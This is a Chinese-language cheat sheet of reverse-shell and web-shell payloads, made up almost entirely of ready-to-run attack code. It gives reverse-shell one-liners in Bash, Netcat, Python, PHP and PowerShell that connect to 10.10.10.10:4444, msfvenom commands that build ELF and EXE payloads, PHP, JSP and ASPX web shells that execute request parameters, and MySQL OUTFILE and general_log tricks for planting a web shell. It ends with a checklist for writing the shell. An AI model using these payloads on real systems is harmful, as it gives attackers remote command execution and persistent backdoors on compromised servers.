# 反弹 Shell 与 WebShell 速查

## 监听

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

## 反弹 Shell

Bash：

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Netcat：

```bash
nc -e /bin/sh 10.10.10.10 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f
```

Python：

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

PHP：

```php
php -r '$s=fsockopen("10.10.10.10",4444);$d=[0=>$s,1=>$s,2=>$s];proc_open("/bin/sh -i",$d,$p);'
```

PowerShell：

```powershell
$c=New-Object Net.Sockets.TCPClient("10.10.10.10",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()};$c.Close()
```

MSFvenom：

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

## WebShell

PHP：

```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
```

JSP：

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASPX：

```aspx
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
```

## Web 写文件

MySQL：

```sql
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

MySQL `general_log`：

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST[1]);?>';
SET GLOBAL general_log = 'OFF';
```

> 写马前先确认：Web 根目录、写权限、`secure_file_priv`、当前数据库权限。